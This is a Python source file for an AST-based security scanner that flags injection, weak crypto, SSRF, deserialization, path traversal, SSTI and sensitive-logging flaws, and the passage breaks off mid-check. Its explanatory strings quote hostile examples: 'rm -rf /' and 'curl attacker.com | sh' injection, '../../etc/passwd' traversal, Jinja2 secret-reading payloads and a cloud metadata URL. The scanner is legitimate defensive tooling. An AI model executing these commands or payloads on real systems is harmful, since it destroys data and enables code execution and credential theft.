"""
Python AST-based security analyzer — OWASP Top 10 + Extended Coverage.

Detects:
  [A01] Broken Access Control   — path traversal via open(), send_file()
  [A02] Crypto Failures         — MD5/SHA1 for passwords, verify=False, weak random,
                                   hardcoded AES IV, http:// in configs
  [A03] Injection               — SQLi, CMDi (os/subprocess/eval), SSTI (Jinja2),
                                   LDAP injection, NoSQL injection, XSS via render_template_string
  [A08] Data Integrity          — pickle.loads, yaml.load without SafeLoader,
                                   marshal.loads deserialization
  [A09] Logging Failures        — sensitive data in log calls, bare except pass
  [A10] SSRF                    — requests.get/post/put with dynamic URL,
                                   urllib.request.urlopen with dynamic URL

Uses the built-in `ast` module — no external dependencies required.
Taint tracking is provided by secara.taint.python_taint.PythonTaintTracker.
"""
from __future__ import annotations

import ast
import logging
from pathlib import Path
from typing import List, Union

from secara.detectors.base import BaseDetector
from secara.output.models import Finding
from secara.taint.python_taint import PythonTaintTracker, _is_taint_source
from secara.taint.interproc_taint import ModuleTaintGraph
from secara.rules.rule_loader import get_rules_for_language

logger = logging.getLogger("secara.python")

FunctionNode = Union[ast.FunctionDef, ast.AsyncFunctionDef]

# YAML configurations will be loaded into PythonAnalyzer instance
_SUBPROCESS_DANGEROUS = {
    "call", "run", "Popen", "check_output", "check_call", "getoutput",
}
_OS_DANGEROUS = {"system", "popen", "getoutput", "getstatusoutput"}

# ── Eval / exec sinks ────────────────────────────────────────────────────────
_EVAL_EXEC_NAMES = {"eval", "exec", "compile"}

# ── Weak crypto hash names ───────────────────────────────────────────────────
_WEAK_HASH_NAMES = {"md5", "sha1", "sha"}

# ── SSRF sinks ───────────────────────────────────────────────────────────────
_REQUESTS_METHODS = {"get", "post", "put", "patch", "delete", "head", "request"}
_URLLIB_SINKS = {"urlopen", "urlretrieve"}

# ── Deserialization sinks ────────────────────────────────────────────────────
_PICKLE_LOADS = {"loads", "load"}
_MARSHAL_LOADS = {"loads", "load"}

# ── Template rendering sinks (SSTI) ──────────────────────────────────────────
_TEMPLATE_SINKS = {"render_template_string", "from_string"}

# ── Logging sinks ────────────────────────────────────────────────────────────
_LOG_METHODS = {"debug", "info", "warning", "error", "critical", "exception"}

# ── Sensitive variable name fragments ────────────────────────────────────────
_SENSITIVE_NAMES = {
    "password", "passwd", "secret", "token", "api_key", "apikey",
    "private_key", "auth", "credential", "ssn", "credit_card", "cvv",
}


def _is_dynamic_string(node: ast.expr, tainted: set[str]) -> bool:
    """
    Return True if *node* represents a non-literal (dynamic) string:
    - An f-string (JoinedStr) containing a non-constant value
    - A binary concatenation (BinOp +) involving a name/call
    - A %-formatted string with non-constant operands
    - A Name reference that is tainted
    - A Call result passed directly
    """
    if isinstance(node, ast.Name):
        return True  # any variable

    if isinstance(node, ast.JoinedStr):  # f-string
        return any(
            isinstance(v, ast.FormattedValue)
            for v in ast.walk(node)
        )

    if isinstance(node, ast.BinOp):
        # String concatenation (a + b) or %-format (a % b)
        if isinstance(node.op, (ast.Add, ast.Mod)):
            # If either side is non-literal, it's dynamic
            left_dynamic = not isinstance(node.left, ast.Constant)
            right_dynamic = not isinstance(node.right, ast.Constant)
            return left_dynamic or right_dynamic

    if isinstance(node, ast.Call):
        return True  # result of a function call is dynamic

    if isinstance(node, ast.Subscript):
        return True  # dict/list access is dynamic

    return False


def _extract_string_constant(node: ast.expr) -> str:
    """Best-effort extraction of a string constant from an AST node."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    return ""


def _looks_like_sql(text: str) -> bool:
    """Heuristic: does this string start with a SQL keyword?"""
    keywords = ("select", "insert", "update", "delete", "drop", "create",
                 "alter", "exec", "execute", "merge", "replace", "call")
    stripped = text.strip().lower()
    return any(stripped.startswith(k) for k in keywords)


def _attr_chain(node: ast.expr) -> list[str]:
    """
    Return the dotted attribute chain for a node as a list, e.g.
    `requests.get` → ['requests', 'get'].
    Returns [] if not a simple Name.Attribute chain.
    """
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    parts.reverse()
    return parts


def _name_looks_sensitive(name: str) -> bool:
    """Does a variable name look like it contains sensitive data?"""
    low = name.lower()
    return any(s in low for s in _SENSITIVE_NAMES)


class PythonAnalyzer(BaseDetector):
    """Full AST-based security analysis for Python files — OWASP Top 10 coverage."""

    def __init__(self):
        super().__init__()
        rules = get_rules_for_language("python")
        self.yaml_rules = {r.id: r for r in rules if r.pattern_type == "ast_sink"}
        
        def _get_funcs(rule_id):
            return set(self.yaml_rules[rule_id].pattern.get("functions", [])) if rule_id in self.yaml_rules else set()
            
        def _get_methods(rule_id):
            return set(self.yaml_rules[rule_id].pattern.get("methods", [])) if rule_id in self.yaml_rules else set()

        self.sql_execute_attrs = _get_funcs("SQL001")
        self.os_dangerous = _get_funcs("CMD001")
        self.subprocess_dangerous = _get_funcs("CMD002")
        self.eval_exec_names = _get_funcs("CMD003")
        self.requests_methods = _get_funcs("SSRF001")
        self.deser_loads = _get_funcs("DSER001")
        self.yaml_loads = _get_funcs("DSER004")
        self.weak_hash = _get_funcs("CRY001")
        self.weak_prng = _get_funcs("CRY003")
        self.path_open = _get_funcs("PATH001")
        self.path_send = _get_funcs("PATH002")
        self.toctou_checks = set(self.yaml_rules["RACE001"].pattern.get("check_functions", [])) if "RACE001" in self.yaml_rules else set()
        self.mass_methods = _get_methods("MASS001")
        self.temp_funcs = _get_funcs("TEMP001")

    def analyze(self, file_path: Path, content: str) -> List[Finding]:
        findings: List[Finding] = []

        try:
            tree = ast.parse(content, filename=str(file_path))
        except SyntaxError as exc:
            logger.debug("Syntax error in %s: %s", file_path, exc)
            return findings

        lines = content.splitlines()

        # ── Build interprocedural taint graph for this module ─────────────
        module_graph = ModuleTaintGraph(tree)
        module_graph.build()

        # Walk all function definitions to enable per-function taint tracking
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                tracker = PythonTaintTracker(module_graph=module_graph)
                tracker.scan_function(node)
                self._analyze_function(
                    file_path, node, tracker, lines, findings
                )

        # Also check bare module-level calls (scripts, not just functions)
        module_tracker = PythonTaintTracker(module_graph=module_graph)
        self._analyze_body(file_path, ast.walk(tree), module_tracker, lines, findings)

        # De-duplicate (same file + line + rule)
        seen = set()
        unique = []
        for f in findings:
            key = (f.file_path, f.line_number, f.rule_id)
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def _analyze_function(
        self,
        file_path: Path,
        func: FunctionNode,
        tracker: PythonTaintTracker,
        lines: list[str],
        findings: List[Finding],
    ) -> None:
        self._analyze_body(file_path, ast.walk(func), tracker, lines, findings)

    def _analyze_body(
        self,
        file_path: Path,
        nodes,
        tracker: PythonTaintTracker,
        lines: list[str],
        findings: List[Finding],
    ) -> None:
        checked_paths = {} # path_str -> check_node
        
        for node in nodes:
            if isinstance(node, ast.If):
                # Handle TOCTOU check-then-return or check-then-open
                finding = self._check_toctou(file_path, node, tracker, lines, checked_paths)
                if finding:
                    findings.append(finding)

            if not isinstance(node, ast.Call):
                continue

            # Check for TOCTOU open() after a check in the same scope
            finding = self._check_toctou_sequential(file_path, node, checked_paths, lines)
            if finding:
                findings.append(finding)

            # ── SQL Injection ──────────────────────────────────────────────
            finding = self._check_sql_injection(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Command Injection ──────────────────────────────────────────
            finding = self._check_cmd_injection(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── eval / exec ────────────────────────────────────────────────
            finding = self._check_eval_exec(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Weak Cryptography [A02] ────────────────────────────────────
            finding = self._check_weak_crypto(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── SSRF [A10] ─────────────────────────────────────────────────
            finding = self._check_ssrf(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Insecure Deserialization [A08] ─────────────────────────────
            finding = self._check_deserialization(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Path Traversal [A01] ───────────────────────────────────────
            finding = self._check_path_traversal(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── SSTI / XSS via render_template_string [A03] ────────────────
            finding = self._check_ssti(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Sensitive Data in Logs [A09] ───────────────────────────────
            finding = self._check_sensitive_logging(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Insecure SSL/TLS [A02] ─────────────────────────────────────
            finding = self._check_insecure_ssl(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Insecure yaml.load [A08] ───────────────────────────────────
            finding = self._check_yaml_load(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Weak random for security [A02] ─────────────────────────────
            finding = self._check_weak_random(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Mass Assignment [A04] ──────────────────────────────────────
            finding = self._check_mass_assignment(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

            # ── Insecure Temporary Files [A01] ─────────────────────────────
            finding = self._check_temp_files(file_path, node, tracker, lines)
            if finding:
                findings.append(finding)

    # ── SQL Injection ─────────────────────────────────────────────────────────
    def _check_sql_injection(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        if "SQL001" not in self.yaml_rules: return None
        rule = self.yaml_rules["SQL001"]
        
        func = call.func
        if not (isinstance(func, ast.Attribute) and func.attr in self.sql_execute_attrs):
            return None

        if not call.args:
            return None

        first_arg = call.args[0]

        # Must be a dynamic string — not a literal constant
        if not _is_dynamic_string(first_arg, tracker.tainted_names):
            return None

        tainted = (
            tracker.is_arg_tainted(call)
            or self._arg_contains_tainted_name(first_arg, tracker.tainted_names)
        )

        # Optionally verify SQL content for higher confidence
        prefix_text = _extract_string_constant(
            first_arg.left if isinstance(first_arg, ast.BinOp) else first_arg
        )
        if prefix_text and not _looks_like_sql(prefix_text):
            return None  # Doesn't look like SQL, skip

        line_no = call.lineno
        return Finding(
            rule_id=rule.id,
            rule_name=rule.name,
            severity=rule.severity,
            file_path=str(file_path),
            line_number=line_no,
            snippet=self.get_snippet(lines, line_no),
            description=rule.description,
            fix=rule.fix,
            language="python",
        )

    def _arg_contains_tainted_name(
        self, node: ast.expr, tainted: set[str]
    ) -> bool:
        for n in ast.walk(node):
            if isinstance(n, ast.Name) and n.id in tainted:
                return True
        return False

    # ── Command Injection ─────────────────────────────────────────────────────
    def _check_cmd_injection(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        func = call.func
        line_no = call.lineno

        # ── os.system / os.popen ──────────────────────────────────────────
        if isinstance(func, ast.Attribute) and func.attr in self.os_dangerous:
            chain = _attr_chain(func.value) if isinstance(func.value, ast.Attribute) \
                else [func.value.id] if isinstance(func.value, ast.Name) else []
            if chain and chain[-1] == "os" and call.args:
                arg0 = call.args[0]
                if _is_dynamic_string(arg0, tracker.tainted_names):
                    if "CMD001" not in self.yaml_rules: return None
                    rule = self.yaml_rules["CMD001"]
                    return Finding(
                        rule_id=rule.id,
                        rule_name=rule.name,
                        severity=rule.severity,
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=rule.description,
                        fix=rule.fix,
                        language="python",
                    )

        # ── subprocess.call / run / Popen with shell=True ─────────────────
        if isinstance(func, ast.Attribute) and func.attr in _SUBPROCESS_DANGEROUS:
            chain = _attr_chain(call.func)
            if chain and chain[0] == "subprocess":
                has_shell_true = self._has_keyword_true(call, "shell")
                if has_shell_true and call.args:
                    arg0 = call.args[0]
                    if _is_dynamic_string(arg0, tracker.tainted_names):
                        return Finding(
                            rule_id="CMD002",
                            rule_name="Command Injection via subprocess with shell=True",
                            severity="HIGH",
                            file_path=str(file_path),
                            line_number=line_no,
                            snippet=self.get_snippet(lines, line_no),
                            description=(
                                f"subprocess.{func.attr}() is called with shell=True and a "
                                "dynamic command string. This is equivalent to passing the command "
                                "to /bin/sh, enabling shell metacharacter injection "
                                "(e.g., ; rm -rf /, && curl attacker.com | sh)."
                            ),
                            fix=(
                                "Remove shell=True. Pass the command as a list to avoid shell expansion:\n"
                                "  subprocess.run(['cmd', arg1, arg2])  # safe\n"
                                "If shell=True is required, validate/sanitize input with shlex.quote()."
                            ),
                            language="python",
                        )

        return None

    def _has_keyword_true(self, call: ast.Call, keyword_name: str) -> bool:
        for kw in call.keywords:
            if kw.arg == keyword_name:
                if isinstance(kw.value, ast.Constant) and kw.value.value is True:
                    return True
        return False

    # ── eval / exec ───────────────────────────────────────────────────────────
    def _check_eval_exec(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        func = call.func
        if not (isinstance(func, ast.Name) and func.id in _EVAL_EXEC_NAMES):
            return None

        if not call.args:
            return None

        arg0 = call.args[0]

        # Literal constant → not a vulnerability (e.g., eval("2+2"))
        if isinstance(arg0, ast.Constant):
            return None

        line_no = call.lineno
        tainted = (
            tracker.is_arg_tainted(call)
            or self._arg_contains_tainted_name(arg0, tracker.tainted_names)
        )

        severity = "HIGH" if tainted else "MEDIUM"

        return Finding(
            rule_id="CMD003",
            rule_name=f"Dangerous Use of {func.id}()",
            severity=severity,
            file_path=str(file_path),
            line_number=line_no,
            snippet=self.get_snippet(lines, line_no),
            description=(
                f"{func.id}() is called with a non-constant argument"
                + (" derived from user input" if tainted else "") + ". "
                "eval() and exec() execute arbitrary Python code. "
                "If any user-controlled data reaches this call, attackers can "
                "execute arbitrary commands on the server."
            ),
            fix=(
                f"Avoid {func.id}() entirely. If you need dynamic behavior, use:\n"
                "  - ast.literal_eval() for safe evaluation of Python literals\n"
                "  - A dispatch dictionary (dict of callables) for dynamic dispatch\n"
                "  - importlib for dynamic imports"
            ),
            language="python",
        )

    # ── Weak Cryptography [A02] ───────────────────────────────────────────────
    def _check_weak_crypto(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # hashlib.md5(), hashlib.sha1(), hashlib.new("md5")
        if len(chain) == 2 and chain[0] == "hashlib":
            algo = chain[1].lower()
            if algo in _WEAK_HASH_NAMES:
                return Finding(
                    rule_id="CRY001",
                    rule_name=f"Weak Hash Algorithm: hashlib.{chain[1]}()",
                    severity="HIGH",
                    file_path=str(file_path),
                    line_number=line_no,
                    snippet=self.get_snippet(lines, line_no),
                    description=(
                        f"hashlib.{chain[1]}() uses a cryptographically broken hash algorithm. "
                        "MD5 and SHA-1 are vulnerable to collision attacks and are banned "
                        "by NIST for any security purpose. Passwords hashed with these "
                        "algorithms can be cracked with rainbow tables in seconds."
                    ),
                    fix=(
                        "Use a strong, purpose-built algorithm:\n"
                        "  - Passwords: bcrypt, scrypt, or argon2 (via passlib or argon2-cffi)\n"
                        "  - Data integrity: hashlib.sha256() or hashlib.sha3_256()\n"
                        "  import hashlib; hashlib.sha256(data).hexdigest()"
                    ),
                    language="python",
                )

            # hashlib.new("md5") / hashlib.new("sha1")
            if algo == "new" and call.args:
                algo_arg = _extract_string_constant(call.args[0]).lower()
                if algo_arg in _WEAK_HASH_NAMES:
                    return Finding(
                        rule_id="CRY001",
                        rule_name=f"Weak Hash Algorithm: hashlib.new('{algo_arg}')",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            f"hashlib.new('{algo_arg}') creates a weak hash object. "
                            f"{algo_arg.upper()} is cryptographically broken and must not be "
                            "used for security-sensitive operations."
                        ),
                        fix=(
                            "Use hashlib.new('sha256') or hashlib.sha256() instead.\n"
                            "For passwords, use passlib.hash.bcrypt or argon2."
                        ),
                        language="python",
                    )

        # md5() / sha1() from Crypto or imported directly
        if len(chain) == 1 and chain[0].lower() in _WEAK_HASH_NAMES:
            return Finding(
                rule_id="CRY001",
                rule_name=f"Weak Hash Algorithm: {chain[0]}()",
                severity="HIGH",
                file_path=str(file_path),
                line_number=line_no,
                snippet=self.get_snippet(lines, line_no),
                description=(
                    f"{chain[0]}() is a cryptographically broken hash function. "
                    "It is vulnerable to collision and preimage attacks."
                ),
                fix=(
                    "Use SHA-256 or SHA-3 for data integrity, "
                    "or bcrypt/argon2 for password hashing."
                ),
                language="python",
            )

        return None

    # ── Insecure SSL / TLS [A02] ──────────────────────────────────────────────
    def _check_insecure_ssl(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        line_no = call.lineno

        # requests.get(..., verify=False)
        chain = _attr_chain(call.func)
        if len(chain) >= 1 and chain[-1] in _REQUESTS_METHODS:
            for kw in call.keywords:
                if kw.arg == "verify":
                    if isinstance(kw.value, ast.Constant) and kw.value.value is False:
                        return Finding(
                            rule_id="CRY002",
                            rule_name="SSL Certificate Verification Disabled",
                            severity="HIGH",
                            file_path=str(file_path),
                            line_number=line_no,
                            snippet=self.get_snippet(lines, line_no),
                            description=(
                                "requests is called with verify=False, which disables SSL/TLS "
                                "certificate verification. This makes the connection vulnerable "
                                "to Man-in-the-Middle (MitM) attacks — an attacker between the "
                                "client and server can intercept and modify traffic undetected."
                            ),
                            fix=(
                                "Remove verify=False to enable certificate verification (the default).\n"
                                "If using a self-signed cert, pass the CA bundle path:\n"
                                "  requests.get(url, verify='/path/to/ca-bundle.crt')"
                            ),
                            language="python",
                        )

        # ssl._create_unverified_context() / ssl.CERT_NONE
        if len(chain) == 2 and chain[0] == "ssl":
            if chain[1] in ("_create_unverified_context", "create_default_context"):
                for kw in call.keywords:
                    if kw.arg == "cert_reqs":
                        val = _extract_string_constant(kw.value)
                        if "CERT_NONE" in val:
                            return Finding(
                                rule_id="CRY002",
                                rule_name="SSL Certificate Verification Disabled (ssl module)",
                                severity="HIGH",
                                file_path=str(file_path),
                                line_number=line_no,
                                snippet=self.get_snippet(lines, line_no),
                                description=(
                                    "ssl context is created with CERT_NONE, disabling certificate "
                                    "validation. This exposes the connection to MitM attacks."
                                ),
                                fix=(
                                    "Use ssl.create_default_context() without cert_reqs=CERT_NONE.\n"
                                    "Never use ssl._create_unverified_context() in production."
                                ),
                                language="python",
                            )

        return None

    # ── Weak Random for Security [A02] ────────────────────────────────────────
    def _check_weak_random(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # random.random(), random.randint(), random.choice(), random.token_hex()
        # We only flag when the result is clearly being used as a token/secret
        weak_random_methods = {
            "random", "randint", "randrange", "choice", "choices",
            "sample", "shuffle", "seed",
        }
        if len(chain) == 2 and chain[0] == "random" and chain[1] in weak_random_methods:
            # Check if assigned to a sensitive variable name
            # We look at the outer assignment (we need to check parent context)
            # As a heuristic, flag with MEDIUM severity — user can suppress
            return Finding(
                rule_id="CRY003",
                rule_name="Insecure Random Number Generator",
                severity="MEDIUM",
                file_path=str(file_path),
                line_number=line_no,
                snippet=self.get_snippet(lines, line_no),
                description=(
                    f"random.{chain[1]}() uses a pseudo-random number generator (PRNG) "
                    "that is not cryptographically secure. Values it generates are "
                    "predictable given knowledge of the seed, making it unsuitable "
                    "for security tokens, session IDs, OTPs, or cryptographic keys."
                ),
                fix=(
                    "Use the secrets module for security-sensitive randomness:\n"
                    "  import secrets\n"
                    "  token = secrets.token_hex(32)   # secure random token\n"
                    "  pin = secrets.randbelow(10**6)  # secure random int"
                ),
                language="python",
            )

        return None

    # ── SSRF [A10] ────────────────────────────────────────────────────────────
    def _check_ssrf(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # requests.get/post/put/..(url, ...) where url is dynamic + tainted
        if len(chain) >= 2 and chain[-2] == "requests" and chain[-1] in _REQUESTS_METHODS:
            if call.args:
                url_arg = call.args[0]
                is_dynamic = _is_dynamic_string(url_arg, tracker.tainted_names)
                is_tainted = (
                    tracker.is_arg_tainted(call)
                    or self._arg_contains_tainted_name(url_arg, tracker.tainted_names)
                )
                if is_dynamic and is_tainted:
                    return Finding(
                        rule_id="SSRF001",
                        rule_name="Server-Side Request Forgery (SSRF) via requests",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            f"requests.{chain[-1]}() is called with a URL that contains "
                            "user-controlled data. This enables Server-Side Request Forgery (SSRF): "
                            "an attacker can redirect the server to make requests to internal "
                            "services (e.g., http://169.254.169.254/metadata for AWS credentials), "
                            "internal databases, or other restricted resources."
                        ),
                        fix=(
                            "Validate the URL before making the request:\n"
                            "  1. Use an allowlist of permitted domains/IPs\n"
                            "  2. Parse the URL and check scheme (https only) and hostname\n"
                            "  3. Block private IP ranges (10.x, 172.16.x, 192.168.x, 127.x)\n"
                            "  from urllib.parse import urlparse\n"
                            "  if urlparse(url).hostname not in ALLOWED_HOSTS: raise ValueError()"
                        ),
                        language="python",
                    )

        # urllib.request.urlopen(url) where url is dynamic + tainted
        if len(chain) >= 2 and chain[-1] in _URLLIB_SINKS:
            if call.args:
                url_arg = call.args[0]
                is_dynamic = _is_dynamic_string(url_arg, tracker.tainted_names)
                is_tainted = (
                    tracker.is_arg_tainted(call)
                    or self._arg_contains_tainted_name(url_arg, tracker.tainted_names)
                )
                if is_dynamic and is_tainted:
                    return Finding(
                        rule_id="SSRF001",
                        rule_name="Server-Side Request Forgery (SSRF) via urllib",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            f"urllib.request.{chain[-1]}() is called with a URL derived from "
                            "user input. This can be exploited for SSRF attacks, allowing "
                            "attackers to access internal services or cloud metadata endpoints."
                        ),
                        fix=(
                            "Validate the target URL against an allowlist of permitted hosts.\n"
                            "Block private/loopback IP ranges and HTTPS-only enforcement."
                        ),
                        language="python",
                    )

        return None

    # ── Insecure Deserialization [A08] ────────────────────────────────────────
    def _check_deserialization(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # pickle.loads(data) / pickle.load(f)
        if len(chain) == 2 and chain[0] in ("pickle", "_pickle", "cPickle") \
                and chain[1] in _PICKLE_LOADS:
            return Finding(
                rule_id="DSER001",
                rule_name="Insecure Deserialization via pickle",
                severity="HIGH",
                file_path=str(file_path),
                line_number=line_no,
                snippet=self.get_snippet(lines, line_no),
                description=(
                    f"pickle.{chain[1]}() deserializes Python objects from bytes. "
                    "If the input data is attacker-controlled, this leads to arbitrary "
                    "code execution (RCE) — pickle can instantiate any Python class and "
                    "call arbitrary methods during deserialization. This is a critical "
                    "vulnerability (CVE-common), exploited in many supply chain attacks."
                ),
                fix=(
                    "Never deserialize untrusted data with pickle.\n"
                    "Safe alternatives:\n"
                    "  - JSON (json.loads) for structured data\n"
                    "  - Protocol Buffers or MessagePack for binary data\n"
                    "  - If pickle is required, use HMAC signing to verify integrity first"
                ),
                language="python",
            )

        # marshal.loads(data)
        if len(chain) == 2 and chain[0] == "marshal" and chain[1] in _MARSHAL_LOADS:
            return Finding(
                rule_id="DSER002",
                rule_name="Insecure Deserialization via marshal",
                severity="HIGH",
                file_path=str(file_path),
                line_number=line_no,
                snippet=self.get_snippet(lines, line_no),
                description=(
                    "marshal.loads() deserializes Python bytecode objects and is "
                    "explicitly documented as unsafe for untrusted data. It can lead "
                    "to arbitrary code execution if the input is attacker-controlled."
                ),
                fix=(
                    "Do not use marshal for untrusted input. Use json.loads() or "
                    "a safe serialization format instead."
                ),
                language="python",
            )

        # shelve.open(user_input) — stores pickled objects
        if len(chain) == 2 and chain[0] == "shelve" and chain[1] == "open":
            if call.args and _is_dynamic_string(call.args[0], tracker.tainted_names):
                return Finding(
                    rule_id="DSER003",
                    rule_name="Potentially Unsafe shelve.open() with Dynamic Path",
                    severity="MEDIUM",
                    file_path=str(file_path),
                    line_number=line_no,
                    snippet=self.get_snippet(lines, line_no),
                    description=(
                        "shelve.open() uses pickle internally. A dynamic path that is "
                        "user-controlled could lead to reading arbitrary pickle data "
                        "or path traversal issues."
                    ),
                    fix=(
                        "Validate and sanitize the shelve path. Ensure it resolves within "
                        "a safe base directory using os.path.realpath()."
                    ),
                    language="python",
                )

        return None

    # ── Path Traversal [A01] ──────────────────────────────────────────────────
    def _check_path_traversal(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # open(user_input) or open(f"uploads/{user_input}")
        if len(chain) == 1 and chain[0] == "open":
            if call.args:
                path_arg = call.args[0]
                is_dynamic = _is_dynamic_string(path_arg, tracker.tainted_names)
                is_tainted = (
                    tracker.is_arg_tainted(call)
                    or self._arg_contains_tainted_name(path_arg, tracker.tainted_names)
                )
                if is_dynamic and is_tainted:
                    return Finding(
                        rule_id="PATH001",
                        rule_name="Path Traversal via open()",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            "open() is called with a file path derived from user input. "
                            "Without validation, an attacker can use path traversal sequences "
                            "(e.g., ../../etc/passwd) to read arbitrary files on the server, "
                            "including sensitive configuration files and private keys."
                        ),
                        fix=(
                            "Resolve and validate the path before opening:\n"
                            "  import os\n"
                            "  base = '/safe/upload/dir'\n"
                            "  safe_path = os.path.realpath(os.path.join(base, filename))\n"
                            "  if not safe_path.startswith(base):\n"
                            "      raise ValueError('Path traversal detected')\n"
                            "  open(safe_path)"
                        ),
                        language="python",
                    )

        # Flask send_file(user_input)
        if len(chain) == 1 and chain[0] == "send_file":
            if call.args:
                path_arg = call.args[0]
                is_dynamic = _is_dynamic_string(path_arg, tracker.tainted_names)
                is_tainted = self._arg_contains_tainted_name(path_arg, tracker.tainted_names)
                if is_dynamic and is_tainted:
                    return Finding(
                        rule_id="PATH002",
                        rule_name="Path Traversal via Flask send_file()",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            "Flask's send_file() is called with a path derived from user input. "
                            "An attacker can use path traversal to serve arbitrary files, "
                            "potentially leaking application secrets or system files."
                        ),
                        fix=(
                            "Use flask.send_from_directory() instead, which validates the path:\n"
                            "  flask.send_from_directory('/safe/upload/dir', filename)"
                        ),
                        language="python",
                    )

        return None

    # ── SSTI / XSS via render_template_string [A03] ───────────────────────────
    def _check_ssti(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # render_template_string(user_input) — Flask/Jinja2 SSTI
        if len(chain) == 1 and chain[0] == "render_template_string":
            if call.args:
                tpl_arg = call.args[0]
                is_dynamic = _is_dynamic_string(tpl_arg, tracker.tainted_names)
                is_tainted = self._arg_contains_tainted_name(tpl_arg, tracker.tainted_names)
                if is_dynamic and is_tainted:
                    return Finding(
                        rule_id="SSTI001",
                        rule_name="Server-Side Template Injection (SSTI) via render_template_string",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            "render_template_string() is called with user-controlled content "
                            "as the template. This allows Server-Side Template Injection (SSTI): "
                            "an attacker can inject Jinja2 expressions like {{ 7*7 }} or "
                            "{{ config.SECRET_KEY }} to execute code or read sensitive data. "
                            "SSTI in Jinja2 can lead to full remote code execution."
                        ),
                        fix=(
                            "Never use user input as the template string.\n"
                            "  - Use render_template() with a fixed template file\n"
                            "  - Pass user data as template variables, not as the template itself:\n"
                            "    render_template('page.html', name=user_input)\n"
                            "  - If dynamic templates are needed, use Jinja2's sandbox"
                        ),
                        language="python",
                    )

        # Jinja2 Environment().from_string(user_input)
        if len(chain) >= 1 and chain[-1] == "from_string":
            if call.args:
                tpl_arg = call.args[0]
                is_tainted = self._arg_contains_tainted_name(tpl_arg, tracker.tainted_names)
                if _is_dynamic_string(tpl_arg, tracker.tainted_names) and is_tainted:
                    return Finding(
                        rule_id="SSTI001",
                        rule_name="Server-Side Template Injection (SSTI) via Jinja2.from_string",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            "Jinja2 Environment.from_string() is called with user-controlled "
                            "template content. This enables SSTI leading to remote code execution."
                        ),
                        fix=(
                            "Pass user data as template variables, not as template source.\n"
                            "If dynamic templates are needed, use Jinja2's SandboxedEnvironment."
                        ),
                        language="python",
                    )

        return None

    # ── Sensitive Data in Logs [A09] ──────────────────────────────────────────
    def _check_sensitive_logging(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        chain = _attr_chain(call.func)
        line_no = call.lineno

        # logging.info(password), logger.debug(token), etc.
        if len(chain) >= 2 and chain[-1] in _LOG_METHODS:
            for arg in list(call.args) + [kw.value for kw in call.keywords]:
                for node in ast.walk(arg):
                    if isinstance(node, ast.Name) and _name_looks_sensitive(node.id):
                        return Finding(
                            rule_id="LOG001",
                            rule_name="Sensitive Data Exposed in Log",
                            severity="MEDIUM",
                            file_path=str(file_path),
                            line_number=line_no,
                            snippet=self.get_snippet(lines, line_no),
                            description=(
                                f"A variable named '{node.id}' (which appears to be sensitive data) "
